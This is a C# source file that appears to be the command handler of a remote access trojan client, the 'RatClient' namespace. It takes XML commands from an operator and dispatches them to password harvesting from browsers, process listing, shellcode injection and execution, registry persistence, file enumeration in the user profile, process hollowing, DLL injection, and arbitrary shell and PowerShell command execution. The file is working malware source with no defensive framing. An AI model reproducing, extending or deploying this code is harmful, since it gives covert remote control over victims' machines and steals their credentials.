using RatClient.WebGather;
using RatClient.ProcManage;
using System;
using System.Xml;
using System.Text;
using System.IO;

namespace RatClient
{
    public class FilterCommands
    {
        public static XmlDocument xmlDoc;
        public FilterCommands()
        {
            xmlDoc = new XmlDocument();
        }

        public byte[] Run(string data)
        {
            xmlDoc.LoadXml(data);
            string command = xmlDoc.SelectSingleNode("/root/command").InnerText;
            if (command == string.Empty)
            {
                return null;
            }
            else if (command == "5df297c2f2da83a8b45cfd012fbf9b3c")
            {
                string type = xmlDoc.SelectSingleNode("/root/type").InnerText;
                string web = xmlDoc.SelectSingleNode("/root/web").InnerText;
                return Passwords.Gather(web, type);
            }
            else if (command == "be425fd08e9ea24230bac47493228ada")
            {
                return ProcInfo.GetFormatedProcesses();
            }
            else if (command == "aea87b24517d08c8ff13601406a0202e")
            {
                byte[] shellonBase = Convert.FromBase64String(xmlDoc.SelectSingleNode("/root/shellonbase").InnerText);
                int targetPid = int.Parse(xmlDoc.SelectSingleNode("/root/targetPid").InnerText);
                bool test = Tools.InjectProcess(shellonBase, procid: targetPid);
                if (test)
                {
                    return new byte[1] { 48 };
                }
                return new byte[1] { 49 };
            }
            else if (command == "2dbab3bcba2fe64f1d2133bc50796496")
            {
                byte[] shellcode = Convert.FromBase64String(xmlDoc.SelectSingleNode("/root/shellonbase").InnerText);
                if (Tools.RunShellCode(shellcode))
                {
                    return new byte[1] { 48 };
                }
                return new byte[1] { 49 };
            }
            else if (command == "e5fcfe07178a109ea0c1e9bd7e9dd772")
            {
                string action = xmlDoc.SelectSingleNode("/root/action").InnerText;
                string name = xmlDoc.SelectSingleNode("/root/name").InnerText;
                if (Info.PersistActionsReg[action](name))
                {
                    return new byte[1] { 48 } ;
                }
                return new byte[1] { 49 };
            }
            else if (command == "ce52e112fb976b2d277f09b6eada379f")
            {
                string path = xmlDoc.SelectSingleNode("/root/path").InnerText.Trim();
                if (path == "default")
                {
                    Console.WriteLine("default was call");
                    path = Environment.GetFolderPath(System.Environment.SpecialFolder.UserProfile);
				}
                Console.WriteLine($"Processing {path} ...");
				byte[] result = Encoding.UTF8.GetBytes(Mtool.FileExp.EXP.GetValidExeAndDir(path));
                Console.WriteLine("End Processig Files");
                return result;
			}
            else if (command == "b11c081208b1d6466c83e37098510d73")
            {
                string exePath = Path.Combine(
					xmlDoc.SelectSingleNode("/root/path").InnerText,
					xmlDoc.SelectSingleNode("/root/file").InnerText
		        );
                Console.WriteLine($"Processing path {exePath}");
                byte[] exePayload = Convert.FromBase64String(
                    xmlDoc.SelectSingleNode("/root/exeonbase").InnerText);
                return Tools.ProcessHollowing(exePath, exePayload) ? new byte[1] { 48 } : new byte[1] { 49 };
			}
            else if (command == "70d78a787fc59a5deb9578a58102ae2d")
            {
                int pid = int.Parse(xmlDoc.SelectSingleNode("/root/targetPid").InnerText);
                byte[] payload = Convert.FromBase64String(xmlDoc.SelectSingleNode("/root/dllonbase").InnerText);
                return Tools.DllInjection(pid, payload) ? new byte[1] { 48 } : new byte[1] { 49 };
            }
            else if(command == "3f1ba9eb608addfb46dac5b51f4a6d87")
            {
                string path = xmlDoc.SelectSingleNode("/root/path").InnerText;
                Directory.SetCurrentDirectory(path);
                return Encoding.UTF8.GetBytes($"{Directory.GetCurrentDirectory()}>");
			}
            else if(command == "adfd9a3aa5bc568d540db256a3782c04")
            {
                return Tools.SwitchShell("powershell.exe");
			}
            else
            {
                bool addCd = !string.IsNullOrEmpty(xmlDoc.SelectSingleNode("/root/getcd").InnerText);
                if (addCd)
                {
                    Console.WriteLine("Adding cd");
                }
                return  Tools.RunCommand(command, addCd: addCd);
            }
        } 
    }
}
